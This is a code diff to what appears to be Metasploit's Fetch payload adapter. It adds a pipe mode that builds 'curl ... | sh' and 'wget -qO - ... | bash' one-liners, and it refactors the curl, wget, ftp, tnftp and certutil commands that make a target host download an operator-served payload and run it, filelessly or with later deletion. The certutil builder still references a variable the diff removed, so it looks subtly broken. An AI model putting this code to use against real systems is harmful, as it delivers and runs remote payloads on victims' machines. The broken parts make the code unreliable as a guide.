@@ -4,7 +4,6 @@ module Msf::Payload::Adapter::Fetch
     register_options(
       [
         Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
-        Msf::OptString.new('FETCH_FILENAME', [ false, 'Name to use on remote system when storing payload; cannot contain spaces or slashes', Rex::Text.rand_text_alpha(rand(8..12))], regex: %r{^[^\s/\\]*$}),
         Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
         # FETCH_SRVHOST defaults to LHOST, but if the payload doesn't connect back to Metasploit (e.g. adduser, messagebox, etc.) then FETCH_SRVHOST needs to be set
         Msf::OptAddressRoutable.new('FETCH_SRVHOST', [ !options['LHOST']&.required, 'Local IP to use for serving payload']),
@@ -18,10 +17,11 @@ module Msf::Payload::Adapter::Fetch
         Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
       ]
     )
-    @delete_resource = true
     @fetch_service = nil
     @myresources = []
     @srvexe = ''
+    @pipe_uri = nil
+    @pipe_cmd = nil
     @remote_destination_win = nil
     @remote_destination_nix = nil
     @windows = nil
@@ -66,6 +66,10 @@ module Msf::Payload::Adapter::Fetch
     "#{srvnetloc}/#{srvuri}"
   end
 
+  def _download_pipe
+    "#{srvnetloc}/#{@pipe_uri}"
+  end
+
   def fetch_bindhost
     datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
   end
@@ -82,10 +86,35 @@ module Msf::Payload::Adapter::Fetch
     opts[:arch] ||= module_info['AdaptedArch']
     opts[:code] = super
     @srvexe = generate_payload_exe(opts)
-    cmd = generate_fetch_commands
+    if datastore['FETCH_PIPE']
+      @pipe_cmd = '(' + generate_fetch_commands + ')'
+      vprint_status(@pipe_cmd)
+      cmd = generate_pipe_command
+      if datastore['FETCH_FILELESS']
+        cmd << 'bash'
+      else
+        cmd << 'sh'
+      end    else
+      cmd = generate_fetch_commands
+    end
     vprint_status("Command to run on remote host: #{cmd}")
     cmd
   end
+
+  def generate_pipe_command
+    # TODO: Make a check method that determines if we support a platform/server/command combination
+    #
+    @pipe_uri = srvuri + 'p'
+    case datastore['FETCH_COMMAND'].upcase
+    when 'WGET'
+      return _generate_wget_pipe
+    when 'CURL'
+      return _generate_curl_pipe
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+  end
+
 
   def generate_fetch_commands
     # TODO: Make a check method that determines if we support a platform/server/command combination
@@ -197,20 +226,23 @@ module Msf::Payload::Adapter::Fetch
     comm || ::Rex::Socket::Comm::Local
   end
 
-  def _execute_add
-    return _execute_win if windows?
+  def _execute_add(get_file_cmd)
+    return _execute_win(get_file_cmd) if windows?
 
-    return _execute_nix
+    return _execute_nix(get_file_cmd)
   end
 
-  def _execute_win
+  def _execute_win(get_file_cmd)
     cmds = " & start /B #{_remote_destination_win}"
     cmds << " & del #{_remote_destination_win}" if datastore['FETCH_DELETE']
-    cmds
+    get_file_cmd << cmds
   end
 
-  def _execute_nix
-    cmds = ";chmod +x #{_remote_destination_nix}"
+  def _execute_nix(get_file_cmd)
+    return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS']
+
+    cmds = get_file_cmd
+    cmds << ";chmod +x #{_remote_destination_nix}"
     cmds << ";#{_remote_destination_nix}&"
     cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
     cmds
@@ -219,16 +251,16 @@ module Msf::Payload::Adapter::Fetch
   def _generate_certutil_command
     case fetch_protocol
     when 'HTTP'
-      cmd = "certutil -urlcache -f http://#{download_uri} #{_remote_destination}"
+      get_file_cmd = "certutil -urlcache -f http://#{download_uri} #{_remote_destination}"
     when 'HTTPS'
       # I don't think there is a way to disable cert check in certutil....
       print_error('CERTUTIL binary does not support insecure mode')
       fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL')
-      cmd = "certutil -urlcache -f https://#{download_uri} #{_remote_destination}"
+      get_file_cmd = "certutil -urlcache -f https://#{download_uri} #{_remote_destination}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    cmd + _execute_add
+    cmd + _execute_add(get_file_cmd)
   end
 
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
@@ -260,37 +292,42 @@ module Msf::Payload::Adapter::Fetch
   def _generate_curl_command
     case fetch_protocol
     when 'HTTP'
-      fetch_command = "curl -so #{_remote_destination} http://#{download_uri}"
+      get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri}"
     when 'HTTPS'
-      fetch_command = "curl -sko #{_remote_destination} https://#{download_uri}"
+      get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri}"
     when 'TFTP'
-      fetch_command = "curl -so #{_remote_destination} tftp://#{download_uri}"
+      get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command)
+    _execute_add(get_file_cmd)
+  end
+
+  def _generate_curl_pipe
+    case fetch_protocol
+    when 'HTTP'
+      pipe_cmd = "curl -s http://#{_download_pipe} | "
+    when 'HTTPS'
+      pipe_cmd = "curl -sk https://#{_download_pipe} | "
+    when 'TFTP'
+      pipe_cmd = "curl -s tftp://#{_download_pipe} | "
     else
-      return fetch_command + " #{_execute_add}"
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
   end
 
   def _generate_ftp_command
     case fetch_protocol
     when 'FTP'
-      fetch_command = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
+      get_file_cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
     when 'HTTP'
-      fetch_command = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}"
+      get_file_cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}"
     when 'HTTPS'
-      fetch_command = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}"
+      get_file_cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command)
-    else
-      return fetch_command + "#{_execute_nix}"
-    end
+    _execute_add(get_file_cmd)
   end
 
   def _generate_tftp_command
@@ -316,35 +353,38 @@ module Msf::Payload::Adapter::Fetch
   def _generate_tnftp_command
     case fetch_protocol
     when 'FTP'
-      fetch_command = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
+      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
     when 'HTTP'
-      fetch_command = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}"
+      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}"
     when 'HTTPS'
-      fetch_command = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}"
+      get_file_cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command)
-    else
-      return fetch_command + "#{_execute_nix}"
-    end
+    _execute_add(get_file_cmd)
   end
 
   def _generate_wget_command
     case fetch_protocol
     when 'HTTPS'
-      fetch_command = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
+      get_file_cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
     when 'HTTP'
-      fetch_command = "wget -qO #{_remote_destination} http://#{download_uri}"
+      get_file_cmd = "wget -qO #{_remote_destination} http://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
 
-    if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command)
+    _execute_add(get_file_cmd)
+  end
+
+  def _generate_wget_pipe
+    case fetch_protocol
+    when 'HTTPS'
+      return "wget --no-check-certificate -qO - https://#{_download_pipe} | "
+    when 'HTTP'
+      return "wget -qO - http://#{_download_pipe} | "
     else
-      return fetch_command + "#{_execute_add}"
+      return nil
     end
   end
 
@@ -359,15 +399,15 @@ module Msf::Payload::Adapter::Fetch
 
     if datastore['FETCH_FILELESS']
       @remote_destination_nix = '$f'
-      return @remote_destination_nix
+    else
+      writable_dir = datastore['FETCH_WRITABLE_DIR']
+      writable_dir = '.' if writable_dir.blank?
+      writable_dir += '/' unless writable_dir[-1] == '/'
+      payload_filename = datastore['FETCH_FILENAME']
+      payload_filename = srvuri if payload_filename.blank?
+      payload_path = writable_dir + payload_filename
+      @remote_destination_nix = payload_path
     end
-    writable_dir = datastore['FETCH_WRITABLE_DIR']
-    writable_dir = '.' if writable_dir.blank?
-    writable_dir += '/' unless writable_dir[-1] == '/'
-    payload_filename = datastore['FETCH_FILENAME']
-    payload_filename = srvuri if payload_filename.blank?
-    payload_path = writable_dir + payload_filename
-    @remote_destination_nix = payload_path
     @remote_destination_nix
   end
 
